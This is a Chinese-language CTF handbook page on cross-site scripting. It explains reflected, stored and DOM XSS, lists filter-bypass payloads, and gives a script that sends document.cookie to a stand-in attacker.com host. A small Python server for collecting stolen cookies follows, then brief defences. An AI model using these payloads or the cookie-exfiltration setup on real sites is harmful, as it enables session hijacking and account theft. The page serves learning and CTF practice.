---
title: XSS 跨站脚本
order: 4
icon: mdi:code-tags
category:
  - CTF
  - 手册
  - Web
---

XSS（Cross-Site Scripting，跨站脚本攻击）是指攻击者将恶意 JavaScript 代码注入到网页中，当其他用户访问该页面时，恶意代码在他们的浏览器中执行。

## 三种类型

### 反射型 XSS

恶意代码在 URL 参数中，服务器直接把参数内容输出到页面，不存储。

```
http://example.com/search?q=<script>alert(1)</script>
```

如果页面直接把 `q` 的值输出到 HTML 中，就会弹出 alert。

### 存储型 XSS（危害最大）

恶意代码被存储到数据库中，每次有用户访问该页面都会触发。

典型场景：评论区、留言板、用户名等。

### DOM 型 XSS

恶意代码通过修改页面的 DOM 结构来执行，不经过服务器。

```javascript
// 危险代码
document.getElementById("output").innerHTML = location.hash.slice(1);
// 访问 http://example.com/#<img src=x onerror=alert(1)>
```

## 常用 Payload

```html
<!-- 基础弹窗（验证是否存在 XSS） -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>

<!-- 绕过过滤 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 大小写绕过 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 编码绕过 -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 窃取 Cookie -->
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>
```

## CTF 中的 XSS 题型

CTF 中的 XSS 题通常需要你：

1. **弹 Cookie**：证明 XSS 存在
2. **窃取管理员 Cookie**：题目有一个"机器人"会访问你提交的 URL，你需要让它的 Cookie 发送到你控制的服务器
3. **绕过 CSP**：Content Security Policy 限制了脚本来源，需要找绕过方法

### 接收 Cookie 的简单服务器

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        params = parse_qs(urlparse(self.path).query)
        if 'c' in params:
            print(f"[+] Cookie: {params['c'][0]}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

## 防御方法（了解原理）

- **HTML 转义**：将 `<`、`>`、`"` 等字符转义为 HTML 实体
- **CSP**：限制页面可以加载的脚本来源
- **HttpOnly Cookie**：防止 JavaScript 读取 Cookie

## 练手推荐

- [XSS Game](https://xss-game.appspot.com/) — Google 出的 XSS 练习
- CTFHub XSS 关
